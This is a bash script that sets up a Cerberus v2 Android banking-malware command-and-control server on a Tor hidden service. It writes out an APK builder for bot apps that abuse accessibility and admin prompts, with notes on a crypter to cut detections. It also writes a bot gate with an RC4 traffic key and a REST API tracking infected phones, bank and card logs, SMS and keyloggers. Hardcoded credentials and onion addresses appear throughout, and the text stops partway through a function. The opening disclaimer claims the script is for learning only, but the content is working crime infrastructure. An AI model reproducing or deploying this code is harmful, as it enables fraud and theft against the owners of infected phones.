#!/bin/bash
#UBUNTU 18.04 CERBERUS V2 SETUP (MY WAY)
#A bash script,  a long time of work, but more problems that need to be fixed.
#It is a work done purely for the purpose of learning. Please do not use it for other purposes !


apt update
apt install systemd nginx tor php-fpm mysql-server php php-cli php-xml php-mysql php-curl php-mbstring php-zip wget unzip curl -y
service apache2 stop

rm -rf /usr/share/tor/tor-service-defaults-torrc
rm -rf /lib/systemd/system/tor.service
read -r -d '' TORCONFIG << EOM
[Unit]
Description=TOR CONFIG

[Service]
User=root
Group=root
RemainAfterExit=yes
ExecStart=/usr/bin/tor --RunAsDaemon 0
ExecReload=/bin/killall tor
KillSignal=SIGINT
TimeoutStartSec=300
TimeoutStopSec=60
Restart=on-failure

[Install]
WantedBy=multi-user.target
EOM

echo "$TORCONFIG" > /lib/systemd/system/tor.service

read -r -d '' ServiceCFG << EOM
HiddenServiceDir /var/lib/tor/cerberus
HiddenServiceVersion 3
HiddenServicePort 80 127.0.0.1:8080
EOM

echo "$ServiceCFG" > /etc/tor/torrc
mkdir /var/www/tor

systemctl daemon-reload
systemctl restart nginx
systemctl restart tor

FPMVERSION=$(find /run/php/ -name 'php7.*-fpm.sock' | head -n 1)

read -r -d '' PHPCONFIGFPM << EOM
    location ~ \.php$ { 
        try_files \$uri =404; 
        include /etc/nginx/fastcgi.conf;
        fastcgi_pass unix:$FPMVERSION; 
    }
EOM

#READ HOSTNAME FOR NGINX WEBSITE
TORHOSTNAME=$(cat /var/lib/tor/cerberus/hostname)

read -r -d '' DefaultNGINX << EOM
server {
        listen 80 default_server;
        listen [::]:80 default_server;
        root /var/www/html;
        index index.html;
        server_name _;
        
        add_header Access-Control-Allow-Origin "*";
        
        location ~ \.php$ {
        try_files \$uri =404;
        include /etc/nginx/fastcgi.conf;
        fastcgi_pass unix:/run/php/php7.4-fpm.sock;
    }
}
server {
    listen 8080 default_server;
    listen [::]:8080 default_server;
    root /var/www/tor;
    index index.php index.html index.htm index.nginx-debian.html;
    # Add index.php to the list if you are using PHP index index.html 
    #index.htm index.nginx-debian.html; server_name server_domain_or_IP;
     server_name lt5276tglxyoku3ektqfg33c5b4iufdtkebprxnyb2xxp7bnbtwurtid.onion;
    autoindex off;
 
    location ~ \.php$ {
        include fastcgi_params;
        fastcgi_split_path_info ^(.+\.php)(.*)$;
        include snippets/fastcgi-php.conf;
        fastcgi_pass unix:/run/php/php7.4-fpm.sock;
        }
        
     location ~* /\. {
        deny all;
        access_log off;
        log_not_found off;
    }
}
EOM

echo "$DefaultNGINX" > /etc/nginx/sites-available/default
sed -i 's/keepalive_timeout/client_max_body_size 200M;\nkeepalive_timeout/g' /etc/nginx/nginx.conf
# bg2qtet2pz3sbddcilgkcab4cvcr2lya3o4325e6cjk72phmv7ui5uad.onion
# S2lsCc5MzmsAb
#HiddenServiceVersion 3

cc

nginx -s reload
systemctl restart nginx
systemctl restart tor

mv users.sql bot.sql

mysql -uroot --password="wiskey" -e "CREATE DATABASE bot /*\!40100 DEFAULT CHARACTER SET utf8 */;"
mysql -uroot --password="wiskey" -e "CREATE USER 'wiskey'@'localhost' IDENTIFIED BY 'wiskey';"
mysql -uroot --password="wiskey" bot < real.sql
mysql -uroot --password="wiskey" -e "GRANT ALL PRIVILEGES ON *.* TO 'wiskey'@'localhost';"
mysql -uroot --password="wiskey" -e "FLUSH PRIVILEGES;"
rm -rf bot.sql

cd /home ;
rm -rf restapi_v2 ; rm -rf source_mmm
cd panel_v2
rm -f -rf node_modules/ ; rm -f -rf build/

TORHOSTNAME=$(cat /var/lib/tor/cerberus/hostname)
read -r -d '' BUILD << EOM
import React from 'react';
import SettingsContext from '../Settings';
import $ from 'jquery';
import { isNullOrUndefined } from 'util';
import { try_eval } from '../serviceF';

class BuilderConfig extends React.Component {

    constructor(props) {
        super(props);
        this.state = {
          url: '',
          appName: '',
          adminName: '',
          AccessibilityName: '',
          tag: '',
          AccessKey: '',
          LaunchBotByActivity: '0',
          ICON: '',
          accessibility_page: '',
          EnableOrDisable: true,
          APKBUILDED: false
        }
    }

    onChangeappName = (e) => {
        this.setState({ 
            appName: e.target.value
        });
    }
    onChangeadminName = (e) => {
        this.setState({ 
            adminName: e.target.value
        });
    }
    onChangeAccessibilityName = (e) => {
        this.setState({ 
            AccessibilityName: e.target.value
        });
    }
    onChangetag = (e) => {
        this.setState({ 
            tag: e.target.value
        });
    }
    onChangeLaunchBotByActivity = (e) => {
        try {
            if(parseInt(e.target.value) >= 0 && parseInt(e.target.value) <= 1500)
            this.setState({ 
                LaunchBotByActivity: e.target.value
            });
        }
        catch (ErrorMsg) {

        }
    }
    
    componentWillMount() {
        this.LoadSettingsFromServer();
    }
    

    UpdatePanel() {
        let request = $.ajax({
            type: 'POST',
            url: SettingsContext.restApiUrl,
            data: {
                'params': new Buffer('{"request":"startUpdateCommand"}').toString('base64')
            }
        });
        
        request.done(function(msg) {
			try {
				let result = JSON.parse(msg);
				if(!isNullOrUndefined(result.error))
				{
					SettingsContext.ShowToastTitle('error', 'ERROR', result.error);
				}
				else
				{
                    SettingsContext.ShowToastTitle('success', 'Update completed', result.msg);
				}
				
            }
            catch (ErrMgs) {
                SettingsContext.ShowToastTitle('error', 'ERROR', 'ERROR WHILE UPDATE. Show console for more details.');
                console.log('Error - ' + ErrMgs);
            }
        }.bind(this));
    }

    async LoadSettingsFromServer() {
        while(isNullOrUndefined(SettingsContext.restApiUrl)) await SettingsContext.sleep(500);
        while(SettingsContext.restApiUrl.length < 15) await SettingsContext.sleep(500);
        let request = $.ajax({
            type: 'POST',
            url: SettingsContext.restApiUrl,
            data: {
                'params': new Buffer('{"request":"getGlobalSettings"}').toString('base64')
            }
        });
        
        request.done(function(msg) {
			try {
				let result = JSON.parse(msg);
				if(!isNullOrUndefined(result.error))
				{
					SettingsContext.ShowToastTitle('error', 'ERROR', result.error);
                    this.LoadSettingsFromServer();
				}
				else
				{
					SettingsContext.arrayUrl = result.arrayUrl;
					SettingsContext.timeInject = result.timeInject;
					SettingsContext.timeCC = result.timeCC;
					SettingsContext.timeMail = result.timeMail;
					SettingsContext.pushTitle = result.pushTitle;
					SettingsContext.pushText = result.pushText;
                    SettingsContext.timeProtect = result.timeProtect;
                    SettingsContext.AccessKey = result.key;
					if(result.updateTableBots == 0) {
						SettingsContext.autoUpdateDelay = 0;
						SettingsContext.autoUpdateEnable = false;
					}
					else {
						SettingsContext.autoUpdateDelay = result.updateTableBots;
						SettingsContext.autoUpdateEnable = true;
					}
					SettingsContext.SaveSettingsCookies();
					this.setState({
                        LoadHash: Math.random().toString(),
                        AccessKey: result.key
                    });
                    
                    if(result.version != SettingsContext.youBotVersion) {
                        SettingsContext.ShowToastTitle('warn', 'Update started...', 'You need update');
                        this.UpdatePanel();
                    }
				}
				
            }
            catch (ErrMgs) {
                SettingsContext.ShowToastTitle('error', 'ERROR', 'ERROR LOADING SETTINGS FROM SERVER. Look console for more details.');
                SettingsContext.ShowToastTitle('error', 'warning', 'Try loading settings again...');
                console.log('Error - ' + ErrMgs);
                this.LoadSettingsFromServer();
            }
        }.bind(this));
    }

    GetAPKFromBuilder() {
        if(!this.state.EnableOrDisable) return;

        if(this.state.url.replace(' ','').length == 0) {
            SettingsContext.ShowToastTitle('warning', 'Please fill', 'Please select URL');
            return;
        }

        if(this.state.appName.replace(' ','').length == 0) {
            SettingsContext.ShowToastTitle('warning', 'Please fill', 'Please fill Name Application');
            return;
        }

        if(this.state.adminName.replace(' ','').length == 0) {
            SettingsContext.ShowToastTitle('warning', 'Please fill', 'Please fill Admin device Name');
            return;
        }

        if(this.state.AccessibilityName.replace(' ','').length == 0) {
            SettingsContext.ShowToastTitle('warning', 'Please fill', 'Please fill Accessibility Name');
            return;
        }

        if(this.state.LaunchBotByActivity.replace(' ','').length == 0) {
            SettingsContext.ShowToastTitle('warning', 'Please fill', 'Please select Launch bot by Activity');
            return;
        }

        if(this.state.tag.replace(' ','').length == 0) {
            SettingsContext.ShowToastTitle('warning', 'Please fill', 'Please fill TAG');
            return;
        }

        if(this.state.AccessKey.replace(' ','').length == 0) {
            SettingsContext.ShowToastTitle('warning', 'Please wait', 'Please wait, while loading info from you license, or go to another tab and go to main');
            return;
        }

        if(this.state.accessibility_page.replace(' ','').length == 0) {
            SettingsContext.ShowToastTitle('warning', 'Please upload', 'Please upload accessibility page from inject list.');
            return;
        }

        
        let request = $.ajax({
            type: 'POST',
            url: 'http://$TORHOSTNAME/builder/start.php',
            data: {
                url: this.state.url,
                name_app: this.state.appName,
                name_admin: this.state.adminName,
                name_accessibility: this.state.AccessibilityName,
                steps: this.state.LaunchBotByActivity,
                tag: this.state.tag,
                key: this.state.AccessKey,
                icon: this.state.ICON,
                accessibility_page: this.state.accessibility_page
            }
        });
        
        this.setState({
            EnableOrDisable: false
        });

        request.done(function(msg) {
			try {
                if(msg.toString().length < 10) {
                    SettingsContext.ShowToastTitle('error', 'ERROR', 'Session ended. Please refresh page!');
                    return;
                }
                this.DownloadFile(msg);
                this.setState({
                    EnableOrDisable: true,
                    appName: '',
                    adminName: '',
                    AccessibilityName: '',
                    tag: ''
                });
            }
            catch (ErrMgs) {
                SettingsContext.ShowToastTitle('error', 'ERROR', 'Error build APK.');
                console.log('Error - ' + ErrMgs);
            }
        }.bind(this));
    }
    
    DownloadFile(contentFile) {
        console.log(contentFile);
        let element = document.getElementById('apkdownloadid');
        element.setAttribute('href', 'data:application/vnd.android.package-archive;base64,' + contentFile);
        let FileName = this.state.appName + ' build.apk';
        element.setAttribute('download', FileName);
        this.setState({
            APKBUILDED: true
        });
        SettingsContext.ShowToast('success', "APK builded");
    }

    

    SelectPNGFile(filess) {
        try {
            let CurrPNGFile = filess[0];
            if(CurrPNGFile.type == "image/png") {
                let reader = new FileReader();
                reader.readAsDataURL(CurrPNGFile);
                reader.onload = function (evt) {
                    let img = new Image();
                    img.src = evt.target.result;
                    img.onload = function(){
                        if(img.width >= 50 && img.height >= 50 && img.width <= 500 && img.height <= 500)
                        {
                            this.setState({ 
                                ICON: evt.target.result.split(',')[1],
                                PngFileValid: true
                            });
                            SettingsContext.ShowToast('success', "Load PNG file complete");
                        }
                        else {
                            this.setState({ 
                                PngFileValid: false
                            });
                            try_eval('document.getElementById("PngFileInput").value = "";');
                            SettingsContext.ShowToast('warning', "Image minimum size 50x50px, max size 500x500px");
                        }
                    }.bind(this);
                }.bind(this);
                reader.onerror = function (evt) {
                    this.setState({ 
                        PngFileValid: false
                    });
                    try_eval('document.getElementById("PngFileInput").value = "";');
                    SettingsContext.ShowToastTitle('error', 'Error', 'error reading file');
                }.bind(this);
            }
            else {
                this.setState({ 
                    PngFileValid: false
                });
                try_eval('document.getElementById("PngFileInput").value = "";');
                SettingsContext.ShowToastTitle('warning', 'PNG', "Please select only PNG files");
            }
        }
        catch (err) {
            this.setState({ 
                PngFileValid: false
            });
            SettingsContext.ShowToastTitle('error', 'Error', err);
        }
    }

    SelectHTMLFile(filess) {
        try {
            let CurrHTMLFile = filess[0];
            if(CurrHTMLFile.type == "text/html") {
                let reader = new FileReader();
                reader.readAsDataURL(CurrHTMLFile);
                reader.onload = function (evt) {
                    this.setState({ 
                        accessibility_page: evt.target.result.split(',')[1],
                        PngFileValid: true
                    });
                    SettingsContext.ShowToast('success', "Load HTML file complete");
                }.bind(this);
                reader.onerror = function (evt) {
                    this.setState({ 
                        PngFileValid: false
                    });
                    try_eval('document.getElementById("HTMLFileInput").value = "";');
                    SettingsContext.ShowToastTitle('error', 'Error', 'error reading file');
                }.bind(this);
            }
            else {
                this.setState({ 
                    PngFileValid: false
                });
                try_eval('document.getElementById("HTMLFileInput").value = "";');
                SettingsContext.ShowToastTitle('warning', 'HTML', "Please select only HTML files");
            }
        }
        catch (err) {
            this.setState({ 
                PngFileValid: false
            });
            SettingsContext.ShowToastTitle('error', 'Error', err);
        }
    }

/*
Connect URL: - here we indicate your domain in the format http://example.com (without a slash at the end) (namely http)
Name Application: - the name of your application
Name Admin Device: - the name that appears in the request for admin rights
Name Accessibility Service: - the name that appears in the accessibility request
Launch Bot By Device Activity - indicates the amount of activity with the phone (steps, movements, tilt angle) through which the bot will work (check for a real phone)
Tag: - Tag bot, you can write anything. It is convenient to use in order to understand which apk which bot.
Key Access: - traffic encryption key. You can take the key from the panel. Settings -> Key Access
Testing Mode: - Enables testing mode. Changes all names to TEST MODE, and disables the lock on the CIS countries.
Mini Crypt APK - can be used to reduce the number of detections
Debug is for developers. Do not just use it.
*/
    render () {
        
        let links = [];
        try {
            links = SettingsContext.arrayUrl.split(',');
        }
        catch (err) {}
        let linksHtml = [];
        links.forEach(function(lnk) {
            linksHtml.push(<a class="dropdown-item" onClick={() => {this.setState({url:lnk})}} href="#">{lnk}</a>);
        }.bind(this));
        
        return (
            <React.Fragment>
                <div class="input-group mb-3">
                    <div class="input-group-prepend">
                        <div class="dropdown">
                            <button disabled={!this.state.EnableOrDisable} class="btn btn-outline-success dropdown-toggle" type="button" id="dropdownMenuButton" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                                Select URL
                            </button>
                            <div class="dropdown-menu" aria-labelledby="dropdownMenuButton">
                                {linksHtml}
                            </div>
                        </div>
                    </div>
                    <input class="form-control" value={this.state.url} readOnly/>
                </div>
                <hr />
                <div class="input-group">
                    <div class="input-group-prepend">
                        <span class="input-group-text" id="">Name Application</span>
                    </div>
                    <input class="form-control" value={this.state.appName} onChange={this.onChangeappName} readOnly={!this.state.EnableOrDisable}/>
                </div>
                <hr />
                <div class="input-group">
                    <div class="input-group-prepend">
                        <span class="input-group-text" id="">Admin device Name</span>
                    </div>
                    <input class="form-control" value={this.state.adminName} onChange={this.onChangeadminName} readOnly={!this.state.EnableOrDisable}/>
                </div>
                <hr />
                <div class="input-group">
                    <div class="input-group-prepend">
                        <span class="input-group-text" id="">Accessibility Name</span>
                    </div>
                    <input class="form-control" value={this.state.AccessibilityName} onChange={this.onChangeAccessibilityName} readOnly={!this.state.EnableOrDisable}/>
                </div>
                <hr />
                <div class="input-group">
                    <div class="input-group-prepend">
                        <span class="input-group-text" id="">Bot TAG</span>
                    </div>
                    <input class="form-control" value={this.state.tag} onChange={this.onChangetag} readOnly={!this.state.EnableOrDisable}/>
                </div>
                <hr />
                <div class="input-group">
                    <div class="input-group-prepend">
                        <span class="input-group-text" id="">Launch bot by Activity [0-1500]</span>
                    </div>
                    <input pattern="[0-9]*" class="form-control" value={this.state.LaunchBotByActivity} onChange={this.onChangeLaunchBotByActivity} readOnly={!this.state.EnableOrDisable}/>
                </div>
                <hr />
                <div class="input-group">
                    <div class="input-group-prepend">
                        <span class="input-group-text" id="">AccessKey</span>
                    </div>
                    <input class="form-control info" value={SettingsContext.AccessKey} readOnly={!this.state.EnableOrDisable}/>
                </div>
                <hr />
                <div class="input-group">
                    <div class="input-group-prepend">
                        <span class="input-group-text">Select ICON (PNG)</span>
                    </div>
                    <div class="custom-file">
                        <input  onChange={ (e) => this.SelectPNGFile(e.target.files) }  type="file" class="custom-file-input" id="IconUploadFile" />
                        <label class="custom-file-label" for="IconUploadFile">Choose file</label>
                    </div>
                </div>
                <hr />
                <div class="input-group mb-3">
                    <div class="input-group-prepend">
                        <span class="input-group-text">Select Accessibility Page (<a class="warn" href="http://$TORHOSTNAME/injects/accessibility.html" download>DOWNLOAD</a>)</span>
                    </div>
                    <div class="custom-file">
                        <input  onChange={ (e) => this.SelectHTMLFile(e.target.files) }  type="file" class="custom-file-input" id="HTMLUploadFile" />
                        <label class="custom-file-label" for="HTMLUploadFile">Choose file</label>
                    </div>
                </div>
                <hr />
                <a id="apkdownloadid" type="button" style={({float:'left'})} class={(this.state.APKBUILDED ? '' : 'disabled ') + "btn btn-outline-info"} disabled={!this.state.APKBUILDED}>Download apk</a>
                <button type="button" onClick={this.GetAPKFromBuilder.bind(this)} style={({float:'right'})} class="btn btn-outline-info" disabled={!this.state.EnableOrDisable}>Build APK now</button>
            </React.Fragment>
        );
    }

}


export default BuilderConfig;
EOM
echo "$BUILD" > /home/panel_v2/src/pages/BuilderConfig.js

curl -sL https://deb.nodesource.com/setup_18.x | sudo -E bash -
sudo apt-get install -y nodejs
npm install -g npm@latest
rm -rf node_modules
npm install
npm audit fix --force
npm update
npm run build && rm -f -rf /var/www/tor && mkdir /var/www/tor && cp -R build/. /var/www/tor

npm install util

read -r -d '' CONFIGPHP << EOM
<?php 
if($_SERVER['SERVER_NAME'] != '$TORHOSTNAME') {
	die('Welcome to my website');
	return;
}
require_once 'medoo.php';

session_start();

// Using Medoo namespace
use Medoo\Medoo;

$database = new Medoo([
	// required
    'database_type' => 'mysql',
    'database_name' => 'bot',
    'server' => 'localhost',
    'username' => 'non-root',
    'password' => 'yArrAk123'
]);

function logOut() {
	session_destroy();
	header("Location: /");
	die();
}

function GetValidSubscribe() {
	global $database;
	
	if(!isset($_SESSION['key']))
		return false;
	
	$res = $database->get("users",
		"end_subscribe", [
		"privatekey" => $_SESSION['key']
		]);
		
	if(!res)
		return false;
	
	return (time()<=strtotime($res));
}
?>
EOM

echo "$CONFIGPHP" > /var/www/tor/config.php

read -r -d '' CONFIGJSON << EOM
{
    "domain":"$TORHOSTNAME",
    "lastBotVersion": "2.0.0.5",
    "license":"1500"
}
EOM

echo "$CONFIGJSON" > /var/www/tor/config.json
##here
mkdir /test/
cd /test/

#wget https://cdn.discordapp.com/attachments/837867884544917509/837869045339914260/sysbig.zip ; wget https://cdn.discordapp.com/attachments/837867884544917509/837868869200510976/control.zip ; wget https://cdn.discordapp.com/attachments/837867884544917509/837869118903812136/sysres.zip
#unzip sysbig.zip ; unzip control.zip ; unzip sysres.zip
#HiddenServiceVersion 3

read -r -d '' USERSCONFIG << EOM
<?php
require_once 'medoo.php';

session_start();

$database = new Medoo([
	// required
    'database_type' => 'mysql',
    'database_name' => 'bot',
    'server' => 'localhost',
    'username' => 'non-root',
    'password' => 'yArrAk123'
]);

function getValidDaysSubscribe($infos) {
    $mytime = strtotime($infos) - time();
    if($mytime > 0) {
        return round(abs($mytime)/60/60/24);
    }
    return 0;
}
?>
EOM
echo "$USERSCONFIG" > /home/control/content/config.php

read -r -d '' GATE << EOM
<?php 

define('url_global_server' , 'http://$TORHOSTNAME/mgdsiofhjdoifhjeoirhjd/');

define('key' , 'barunis');

define('server' , 'localhost');

define('db', 'bot');

define('user', 'non-root');

define('passwd', 'yArrAk123');



class RC4Crypt {

	public static function encrypt_ ($pwd, $data, $ispwdHex = 0){

			if ($ispwdHex)

					$pwd = @pack('H*', $pwd);



			$key[] = '';

			$box[] = '';

			$cipher = '';

			$pwd_length = strlen($pwd);

			$data_length = strlen($data);



			for ($i = 0; $i < 256; $i++){

					$key[$i] = ord($pwd[$i % $pwd_length]);

					$box[$i] = $i;

			}

			for ($j = $i = 0; $i < 256; $i++){

					$j = ($j + $box[$i] + $key[$i]) % 256;

					$tmp = $box[$i];

					$box[$i] = $box[$j];

					$box[$j] = $tmp;

			}

			for ($a = $j = $i = 0; $i < $data_length; $i++){

					$a = ($a + 1) % 256;

					$j = ($j + $box[$a]) % 256;

					$tmp = $box[$a];

					$box[$a] = $box[$j];

					$box[$j] = $tmp;

					$k = $box[(($box[$a] + $box[$j]) % 256)];

					$cipher .= chr(ord($data[$i]) ^ $k);

			}

			return $cipher;

	}

	public static function decrypt_ ($pwd, $data, $ispwdHex = 0){

			return RC4Crypt::encrypt_($pwd, $data, $ispwdHex);

	}

}

function encrypt($string, $key){

	return base64_encode(bin2hex(RC4Crypt::encrypt_($key, $string)));

} 

function decrypt($string, $key){

	return RC4Crypt::decrypt_($key,  hex2bin(base64_decode($string)));

}
EOM
echo "$GATE" > /home/sysres/source/gate/conf.php

read -r -d '' RESTAPI << EOM
<?php

define('key' , 'barunis');
define('server' , 'localhost');
define('db', 'bot');
define('user', 'non-root');
define('passwd' , 'yArrAk123');
define('botver', '2.0.0.5');

class database{

	static private $_connection = null;
	static function Connection()
	{
		if (!self::$_connection)
		{
			self::$_connection = new PDO('mysql:host='.server.';dbname='.db, user, passwd);
		}
		return self::$_connection;
	}

	function getArgsForUpdate() {
		return key.' '.passwd;
	}

	function getBots($currentPage, $sorting, $limit, $countrycode, $findbyid){
		/*
		0 - online
		1 - offline
		2 - dead
		3 - Exist App Banks
		3 - No Exist App Banks
		5 - statBank==1
		6 - statCC==1
		7 - statMail==1
		*/
		$strMySQL = "SELECT * FROM bots ";//---Sorting---
		$paramsMySQL = "";
		if (preg_match('/1/', $sorting)) {
			$paramsMySQL = "WHERE ";
			if(substr($sorting,0,1)=="1"){//online
				$paramsMySQL  = $paramsMySQL."(TIMESTAMPDIFF(SECOND,`lastconnect`, now())<=120) AND ";
			}
			if(substr($sorting,1,1)=="1"){//offline
				$paramsMySQL  = $paramsMySQL."((TIMESTAMPDIFF(SECOND,`lastconnect`, now())>=121) AND (TIMESTAMPDIFF(SECOND,`lastconnect`, now())<=144000)) AND ";
			}
			if(substr($sorting,2,1)=="1"){//dead
				$paramsMySQL  = $paramsMySQL."(TIMESTAMPDIFF(SECOND,`lastconnect`, now())>=144001) AND ";
			}
			if(substr($sorting,3,1)=="1"){//install banks
				$paramsMySQL  = $paramsMySQL."(banks != '') AND ";
			}
			if(substr($sorting,4,1)=="1"){//no install banks
				$paramsMySQL  = $paramsMySQL."((banks = '') OR (banks IS NULL)) AND ";
			}
			if(substr($sorting,5,1)=="1"){//statBanks
				$paramsMySQL  = $paramsMySQL."(statBanks = '1') AND ";
			}
			if(substr($sorting,6,1)=="1"){//statCards
				$paramsMySQL  = $paramsMySQL."(statCards = '1') AND ";
			}
			if(substr($sorting,7,1)=="1"){//statMails
				$paramsMySQL  = $paramsMySQL."(statMails = '1') AND ";
			}
			if(substr($sorting,8,1)=="1" && strlen($countrycode) > 1){//botFilterCountry
				$paramsMySQL  = $paramsMySQL."(country = '".$countrycode."') AND ";
			}
			if(substr($sorting,9,1)=="1" && strlen($findbyid) > 1){//bot find by ID
				$paramsMySQL  = $paramsMySQL."(idbot = '".$findbyid."') AND ";
			}
			if(substr($paramsMySQL, -5) == " AND " ){
				$paramsMySQL = substr($paramsMySQL,0,-5);
			}
		}
		$connection = self::Connection();
		$connection->exec('SET NAMES utf8');
		$limitBots=(strlen($limit)>0)?$limit:10; //select data db!
		$countBots = $connection->query("SELECT COUNT(*) as count FROM bots $paramsMySQL")->fetchColumn();
		$pages = ceil($countBots / $limitBots);
		$startLimit = ($currentPage - 1) * $limitBots;
		//return  $strMySQL.$paramsMySQL." LIMIT $startLimit, $limitBots";
		$strMySQL = $strMySQL.$paramsMySQL." LIMIT $startLimit, $limitBots";

		$statement = $connection->prepare($strMySQL); 
		$statement->execute();
		$json = [
			"bots"=>[],
			"pages"=>(string)$pages,
			"currentPage"=>(string)$currentPage
		];
		$index = 0;
		
		foreach($statement as  $row){
			$secondsConnect = strtotime(date('Y-m-d H:i:s'))-strtotime($row['lastconnect']);
			$index++;
			$json['bots'] []= [
				'id' => (string)$row['idbot'],
				'version' => (string)$row['android'],
				'tag'=> (string)$row['TAG'],
				'ip' => (string)$row['ip'],
				'commands' => (string)$row['commands'],
				'country' => (string)$row['country'],
				'banks'=> (string)$row['banks'],
				'lastConnect' => (string)$secondsConnect,
				'dateInfection' => (string)$row['date_infection'],
				'comment' => (string)$row['comment'],
				'statScreen' => (string)$row['statScreen'],
				'statAccessibility' => (string)$row['statAccessibility'],
				'statProtect' => (string)$row['statProtect'],
				'statBanks' => (string)$row['statBanks'],
				'statModule' => (string)$row['statDownloadModule'],
				'statAdmin' => (string)$row['statAdmin']
			];
		}
		return json_encode($json);
	}
	
	private function CheckUpdates()
	{
        if(!$this->columnExists('dataInjections','type'))
        {
            $connection = self::Connection();
            $statement = $connection->prepare("ALTER TABLE `dataInjections` ADD `type` INT(0) NOT NULL AFTER `icon`");	
            $count = $statement->execute();
        }
	}
	
	private function columnExists($tblName, $clmnName)
	{
        $connection = self::Connection();
		$statement = $connection->prepare("SHOW COLUMNS FROM ? LIKE ?");	
		$count = $statement->execute([$tblName, $clmnName]);
		if ( $count != 0 )
			return true;
		return false;
	}

	private function tableExists($tblName)
	{
		$connection = self::Connection();
		$statement = $connection->prepare("SELECT COUNT(*) as cnt from INFORMATION_SCHEMA.TABLES where table_name = ?");	
		$statement->execute([$tblName]);
		$tableCount = $statement->fetchColumn();
		if ( $tableCount != 0 )
			return true;
		return false;
	}

	function statLogs($idbot){
		$connection = self::Connection();
		$connection->exec('SET NAMES utf8');
		if (!$this->tableExists("LogsSMS_$idbot")) return '0'; else return '1'; 
	}
	
	function statKeylogger($idbot){
		$connection = self::Connection();
		$connection->exec('SET NAMES utf8');
		if ( !$this->tableExists("keylogger_$idbot") ) return '0'; else return '1';	
	}

	function statLogsSMS($idbot){
		$connection = self::Connection();
		$connection->exec('SET NAMES utf8');
		$statement = $connection->prepare("SELECT COUNT(logs) as cnt FROM logsBotsSMS WHERE idbot=?");//Logs Bot SMS
		$statement->execute([$idbot]);
		if($statement->fetchColumn()=='0')return '0'; else return '1';
	}
	
	function statLogsApp($idbot){
		$connection = self::Connection();
		$connection->exec('SET NAMES utf8');
		$statement = $connection->prepare("SELECT COUNT(logs) as cnt FROM logsListApplications WHERE idbot= ? ");//Logs Bot App
		$statement->execute([$idbot]);
		if($statement->fetchColumn()=='0')return '0'; else return '1';
	}

	function statLogsNumber($idbot){
		$connection = self::Connection();
		$connection->exec('SET NAMES utf8');
		$statement = $connection->prepare("SELECT COUNT(logs) as cnt FROM logsPhoneNumber WHERE idbot= ? ");//Logs Bot PhoneNumber
		$statement->execute([$idbot]);
		if($statement->fetchColumn()=='0')return '0'; else return '1';
	}


	function getBotsFull($idbot){
		$connection = self::Connection();
		$connection->exec('SET NAMES utf8');
		$statement = $connection->prepare("SELECT * FROM bots WHERE idbot=? LIMIT 1");
		$statement->execute([$idbot]);
		
		$row = $statement->fetch();
		if (!$row)
			return json_encode(["error"=>"No Exist IDBOT"]);
		$secondsConnect = strtotime(date('Y-m-d H:i:s'))-strtotime($row['lastconnect']);
		$json = [
			'id'=>(string)$row['idbot'],
			'version'=>(string)$row['android'],
			'tag'=>(string)$row['TAG'],
			'country'=>(string)$row['country'],
			'banks' => (string)$row['banks'],
			'lastConnect' =>(string)$secondsConnect,
			'dateInfection'=>(string)$row['date_infection'],
			'ip' => (string)$row['ip'],
			'operator'=>(string)$row['operator'],
			'model' => (string)$row['model'],
			'phoneNumber'=>(string)$row['phoneNumber'],
			'commands' => (string)$row['commands'],
			'comment' => (string)$row['comment'],
			'statProtect' => (string)$row['statProtect'],
			'statScreen' => (string)$row['statScreen'],
			'statAccessibility'=>(string)$row['statAccessibility'],
			'statSMS' => (string)$row['statSMS'],
			'statCards' => (string)$row['statCards'],
			'statBanks' => (string)$row['statBanks'],
			'statMails' => (string)$row['statMails'],
			'activeDevice' => (string)$row['activeDevice'],
			'timeWorking' => (string)$row['timeWorking'],
			'statDownloadModule' => (string)$row['statDownloadModule'],
			'statAdmin'=> (string)$row['statAdmin'],
			'statLogs' => $this->statLogs($idbot),
			'statLogsSmsSaved' => $this->statLogsSMS($idbot),
			'statLogsApp' => $this->statLogsApp($idbot),
			'statLogsNumber' => $this->statLogsNumber($idbot),
			'statLogsKeylogger' => $this->statKeylogger($idbot),
			'locale' => (string)$row ['locale'],
			'batteryLevel' => (string)$row['batteryLevel'],
			'updateSettings' => (string)$row['updateSettings']
		];
		return json_encode($json); 
	}

	function deleteBots($idbot){
		$connection = self::Connection();
		$connection->exec('SET NAMES utf8');
		$arrayIdBot = explode(",",$idbot);
		foreach($arrayIdBot as $id){
			if(!empty($id)){
				$statement = $connection->prepare("DELETE FROM bots WHERE idbot= ?");
				$statement->execute([$id]);

				$statement = $connection->prepare("DELETE FROM settingBots WHERE idbot=?");
				$statement->execute([$id]);

				$statement = $connection->prepare("DELETE FROM logsPhoneNumber WHERE idbot = ?");
				$statement->execute([$id]);

				$statement = $connection->prepare("DELETE FROM logsListApplications WHERE idbot = ?");
				$statement->execute([$id]);

				$statement = $connection->prepare("DELETE FROM logsBotsSMS WHERE idbot = ?");
				$statement->execute([$id]);

				if($this->tableExists("LogsSMS_$idbot")){
					$statement = $connection->prepare("DROP TABLE LogsSMS_$idbot");
					$statement->execute();
				}
				if($this->tableExists("keylogger_$idbot")){
					$statement = $connection->prepare("DROP TABLE keylogger_$idbot");
					$statement->execute();
				}
			}
		}
		return json_encode(['message'=>'ok']);
	}

	function mainStats(){
		/*
		Bots
		Online
		Offline
		Deads
		Banks
		CC
		Mails
		*/
		$connection = self::Connection();
		$connection->exec('SET NAMES utf8');
		$countBots = $connection->query("SELECT COUNT(*) as count FROM bots")->fetchColumn();
		$online = $connection->query("SELECT COUNT(*) as count FROM bots WHERE (TIMESTAMPDIFF(SECOND,`lastconnect`, now())<=120)")->fetchColumn();
		$offline = $connection->query("SELECT COUNT(*) as count FROM bots WHERE ((TIMESTAMPDIFF(SECOND,`lastconnect`, now())>=121) AND (TIMESTAMPDIFF(SECOND,`lastconnect`, now())<=144000))")->fetchColumn();
		$dead = $connection->query("SELECT COUNT(*) as count FROM bots WHERE (TIMESTAMPDIFF(SECOND,`lastconnect`, now())>=144001)")->fetchColumn();
		$banks = $connection->query("SELECT COUNT(*) as count FROM logsBank")->fetchColumn();
		 //$cards = $connection->query("SELECT COUNT(*) as count FROM logsCC")->fetchColumn();
		//$mails = $connection->query("SELECT COUNT(*) as count FROM logsMail")->fetchColumn();
		return json_encode([
			"bots"=>(string)$countBots,
			"online"=>(string)$online,
			"offline"=>(string)$offline,
			"dead"=>(string)$dead,
			"banks"=>(string)$banks
			
		]);
	}

	function setCommand($idbot, $command){
		$connection = self::Connection();
		$connection->exec('SET NAMES utf8');
